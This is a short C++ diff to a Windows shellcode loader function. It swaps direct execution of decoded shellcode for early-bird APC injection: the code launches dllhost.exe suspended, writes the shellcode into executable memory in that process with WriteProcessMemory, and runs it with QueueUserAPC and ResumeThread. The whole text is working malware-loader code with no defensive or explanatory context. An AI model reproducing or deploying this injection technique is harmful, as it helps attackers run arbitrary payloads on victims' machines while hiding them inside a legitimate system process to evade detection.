@@ -175,9 +175,16 @@ DWORD WINAPI shellcode_run(LPVOID lpParameter)
     int len = hexstring.length();
     unsigned char shellcode[2048] = { 0 };
     memcpy(shellcode, shellcode_str.c_str(), len / 2 + 1);
-    LPVOID Memory = VirtualAlloc(NULL, len / 2 + 1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    memcpy(Memory, shellcode, len / 2 + 1);
-    //����
-    ((void(*)())Memory)();
+    UINT shellcodeSize = sizeof(shellcode);
+    STARTUPINFOA si = { 0 };
+    PROCESS_INFORMATION pi = { 0 };
+    CreateProcessA("C:\\Windows\\System32\\dllhost.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+    HANDLE victimProcess = pi.hProcess;
+    HANDLE threadHandle = pi.hThread;
+    LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
+    WriteProcessMemory(victimProcess, shellAddress, shellcode, shellcodeSize, NULL);
+    QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
+    ResumeThread(threadHandle);
     return 0;
 }
